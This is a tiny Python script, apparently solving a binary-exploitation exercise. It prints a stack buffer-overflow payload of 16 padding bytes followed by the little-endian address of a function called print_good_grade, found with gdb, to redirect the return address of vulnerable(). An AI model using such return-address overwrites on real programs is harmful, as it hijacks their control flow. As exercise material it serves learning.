import sys

"""
16: offset until ret addr in vulnerable()
0x8048C23: addr to print_good_grade

(gdb) p print_good_grade
$1 = {<text variable, no debug info>} 0x8048c23 <print_good_grade>
"""

sys.stdout.buffer.write(b"A" * 16 + 0x8048C23.to_bytes(4, "little"))
